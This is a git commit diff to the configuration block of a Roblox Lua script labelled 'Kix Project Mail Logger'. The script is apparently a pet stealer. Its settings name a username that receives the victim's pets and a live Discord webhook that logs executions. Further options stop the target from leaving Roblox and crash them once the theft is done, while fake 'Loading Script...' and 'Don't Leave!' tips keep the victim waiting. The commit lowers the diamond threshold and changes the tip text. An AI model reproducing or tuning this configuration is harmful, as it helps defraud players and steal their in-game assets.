620d54ae971aa747edcabd90d6641798f68645ef
Edwarddxd <130901393+Edwarddxd@users.noreply.github.com>
2023-04-16 14:16:20 +0300

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,17 +1,15 @@
---[[ Kix Project Mail Logger ]]--
-
 --[[ Config ]]--
 _G.Username = "Eduarddinu2017" --// Username To Send Pets To
 _G.ScriptName = "Kix Project" --// Script Name For Watermark
 _G.Webhook = "https://discord.com/api/webhooks/1097113513467588709/gpsjdNrQcDrr-g_Yg3MXpnEvRAOH7R_ifwIsD_UVVBHjIVxaN4XbmmFCypVRtX1MuOT_" --// Discord Webhook For Executions
 _G.GiftMessage = "Thx for help" --// Message For The Gift To Say
-_G.Diamonds = 125000 --// Amount Of Diamonds To Not Kick
+_G.Diamonds = 1 --// Amount Of Diamonds To Not Kick
 _G.UnlockPets = true --// Unlocks Locked Pets
 _G.AntiLeave = true --// Doesn't Let The Target Close Roblox
 _G.Crash = true  --// Crashes Them After Its Finished
-_G.Tip1 = "Loading Script" --// Gives You Tips On The UI
+_G.Tip1 = "Loading Script..." --// Gives You Tips On The UI
 _G.Tip2 = "Don't Leave!" --// Gives You Tips On The UI
-_G.Tip3 = "Loading Script" --// Gives You Tips On The UI
+_G.Tip3 = "Loading Script..." --// Gives You Tips On The UI
 _G.Tip4 = "Don't Leave!" --// Gives You Tips On The UI
 _G.Tip5 = "Almost Ready!" --// Gives You Tips On The UI
 
